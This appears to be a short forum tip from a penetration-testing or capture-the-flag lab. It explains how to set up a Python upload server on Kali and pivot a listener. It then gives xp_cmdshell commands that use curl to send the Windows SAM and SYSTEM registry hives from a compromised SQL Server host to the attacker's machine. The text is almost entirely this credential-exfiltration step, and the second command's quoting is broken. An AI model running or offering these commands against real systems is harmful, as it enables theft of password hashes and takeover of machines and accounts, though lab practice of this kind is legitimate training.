

Try using python uploadserver. Install with  python3 -m pip install uploadserver . Set up a simple listener listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp. Set up a python uploadserver on Kali with python3 -m uploadserver 80 and upload your SAM and SYSTEM with:
```
xp_cmdshell "curl -X POST http://10.10.108.147/upload -F files=@"C:\windows.old\Windows\System32\SAM""
xp_cmdshell "curl -X POST http://10.10.108.147/upload -F files=@"C:\windows.old\Windows\System32\SYSTEM
```
